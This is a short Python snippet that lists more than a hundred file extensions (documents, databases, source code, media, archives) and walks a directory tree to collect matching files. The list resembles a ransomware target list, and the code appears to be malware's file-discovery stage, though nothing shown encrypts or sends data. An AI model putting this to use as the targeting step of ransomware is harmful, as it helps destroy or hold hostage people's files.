import os

target_ext = ['.jpg', '.jpeg', '.raw', '.tif', '.gif', '.png', '.bmp',
'.3dm', '.max',
'.accdb', '.db', '.dbf', '.mdb', '.pdb', '.sql',
'.dwg', '.dxf',
'.c', '.cpp', '.cs', '.h', '.php', '.asp', '.rb', '.java', '.jar', '.class', '.py', '.js',
'.aaf', '.aep', '.aepx', '.plb', '.prel', '.prproj', '.aet', '.ppj', '.psd', '.indd', '.indl', '.indt', '.indb', '.inx', '.idml', '.pmd', '.xqx', '.ai', '.eps', '.ps', '.svg', '.swf', '.fla', '.as3', '.as',
'.txt', '.doc', '.dot', '.docx', '.docm', '.dotx', '.dotm', '.docb', '.rtf', '.wpd', '.wps', '.msg', '.pdf',
'.xls', '.xlt', '.xlm', '.xlsx', '.xlsm', '.xltx', '.xltm', '.xlsb', '.xla', '.xlam', '.xll', '.xlw',
'.ppt', '.pot', '.pps', '.pptx', '.pptm', '.potx', '.potm', '.ppam', '.ppsx', '.ppsm', '.sldx', '.sldm',
'.wav', '.mp3', '.aif', '.iff', '.m3u', '.m4u', '.mid', '.mpa', '.wma', '.ra', '.avi', '.mov', '.mp4', '.3gp', '.mpeg', '.3g2', '.asf', '.asx', '.flv', '.mpg', '.wmv', '.vob', '.m3u8', '.mkv',
'.dat', '.csv', '.efx', '.sdf', '.vcf', '.xml', '.ses',
'.rar', '.zip', '.7zip']

def find_targets(root):
    target_files = []
    for dirpath, dirs, files in os.walk(root):
        for f in files:
            if any(f.lower().endswith(ext) for ext in target_ext):
                target_files.append(os.path.join(dirpath, f))
    return target_files
